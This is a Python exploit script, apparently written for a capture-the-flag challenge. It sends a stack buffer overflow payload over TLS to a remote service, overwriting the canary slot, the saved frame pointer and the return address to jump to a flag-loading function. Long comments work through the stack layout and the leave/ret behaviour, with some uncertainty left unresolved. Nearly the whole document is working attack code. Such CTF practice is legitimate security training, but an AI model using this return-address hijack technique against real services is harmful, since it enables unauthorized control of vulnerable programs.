import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40

# Key insight: DON'T overwrite saved RBP!
# Just overwrite: buffer + canary + KEEP RBP + overwrite return address
# But we can't "keep" RBP without knowing its value...
# 
# Actually, we CAN! We just send exactly 56 bytes:
# 40 (buffer) + 8 (canary) + 8 (saved RBP - don't touch!)
# Then the NEXT 8 bytes will overwrite the return address!

# Wait, that won't work because recv will only read len_copied bytes total.
# If we send 56 bytes for the buffer+canary+rbp, we can't also overwrite ret addr.
#
# Let me re-think... We send a length, then that many bytes are read into the buffer.
# Buffer is 40 bytes, canary is at +40, saved RBP is at +48, return addr is at +56.
#
# So if we send length=64, it will read 64 bytes starting at the buffer:
# [0-39]: buffer
# [40-47]: canary
# [48-55]: saved RBP  
# [56-63]: return address
#
# We can send: 40 bytes of padding + 8 bytes canary + 8 bytes JUNK (overwrites RBP) + 8 bytes return addr
# The problem is we're still overwriting RBP with junk.
#
# WAIT! What if the saved RBP value doesn't matter for load_flag_to_location?
# Let me check what load_flag_to_location does with RBP...

# Actually, I just realized: when greet_user returns, it does `leave; ret`.
# `leave` = `mov %rbp,%rsp; pop %rbp`
# So it WILL restore RBP from the stack (our fake value), then pop the return address.
# 
# The key is: after `leave`, RSP points to the return address.
# After `ret`, RSP points to whatever is after the return address.
#
# So when load_flag_to_location starts, RSP will point to the byte after our return address!
# And load_flag_to_location's prologue will do `push %rbp; mov %rsp,%rbp`.
# This creates a NEW stack frame!
#
# So maybe it doesn't matter what we put in saved RBP, as long as the stack after
# the return address is valid?

# Let me try: buffer + canary + ANYTHING for RBP + load_flag_to_location address
# Then after that, I need to ensure there's valid stack space.

LOAD_FLAG = 0x401b72

payload = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8  # Fake RBP (doesn't matter?)
    + (LOAD_FLAG).to_bytes(8, "little")
)

print(f"Payload length: {len(payload)}")
print("Connecting...")

raw = socket.create_connection((HOST, PORT), timeout=5)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)

s.sendall(str(len(payload)).encode() + b"\n")

# Wait for prompt
buf = b""
s.settimeout(3.0)
while True:
    chunk = s.recv(1024)
    if not chunk: break
    buf += chunk
    if b"what is your name?" in buf:
        break

print("Sending payload...")
s.sendall(payload)
time.sleep(1)

# Navigate
s.sendall(b"3\n")
time.sleep(0.3)
s.sendall(b"1\n")

print("\n=== OUTPUT ===")
s.settimeout(3.0)
full_output = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        full_output += chunk
        print(chunk.decode(errors='replace'), end='')
except:
    pass

s.close()

if b"JUL{" in full_output:
    print("\n\n*** FLAG FOUND! ***")
